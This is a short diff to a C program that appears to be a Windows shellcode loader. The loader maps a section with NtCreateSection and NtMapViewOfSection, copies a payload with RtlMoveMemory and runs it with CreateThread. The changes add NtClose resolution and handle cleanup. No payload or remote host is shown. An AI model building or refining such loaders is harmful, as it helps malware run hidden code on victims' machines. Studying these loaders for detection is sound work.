@@ -9,6 +9,7 @@ Compile:
 
 Technique:
     - allocation: NtCreateSection + NtMapViewOfSection
+    - writing:    RtlMoveMemory
     - permission: 
     - execution:  CreateThread
 */
@@ -19,7 +20,6 @@ Technique:
 /* ========= some definition ========= */
 #define STATUS_SUCCESS       ((NTSTATUS)0x00000000L)
 #define NT_SUCCESS(Status)   ((NTSTATUS)(Status) == STATUS_SUCCESS)
-#define GetCurrentProcess()  ((HANDLE)(LONG_PTR) -1)
 
 typedef struct _UNICODE_STRING {
 	USHORT Length;
@@ -69,6 +69,9 @@ typedef NTSTATUS NTAPI NtUnmapViewOfSection_t (
 );
 typedef NtUnmapViewOfSection_t FAR * pNtUnmapViewOfSection;
 
+typedef NTSTATUS NTAPI NtClose_t (HANDLE SectionHandle);
+typedef NtClose_t FAR * pNtClose;
+
 
 int main ()
 {
@@ -92,13 +95,15 @@ int main ()
     pNtCreateSection        NtCreateSection;
     pNtMapViewOfSection     NtMapViewOfSection;
     pNtUnmapViewOfSection   NtUnmapViewOfSection;
+    pNtClose                NtClose;
 
     // resolve all functions
     ntdll = GetModuleHandle("ntdll.dll");
     NtCreateSection         =   (pNtCreateSection)    GetProcAddress(ntdll, "NtCreateSection");
     NtMapViewOfSection      =  (pNtMapViewOfSection)  GetProcAddress(ntdll, "NtMapViewOfSection");
     NtUnmapViewOfSection    = (pNtUnmapViewOfSection) GetProcAddress(ntdll, "NtUnmapViewOfSection");
-    
+    NtClose                 =       (pNtClose)        GetProcAddress(ntdll, "NtClose");
+
     // allocate memory buffer for payload as READ-WRITE (no executable)
     capacity.HighPart = 0;
     capacity.LowPart  = 0x1000;
@@ -117,6 +122,7 @@ int main ()
 
     // deallocate the space
     NtUnmapViewOfSection (GetCurrentProcess(), &runtime);
+    NtClose (h_section);
 
     return 0;
 }
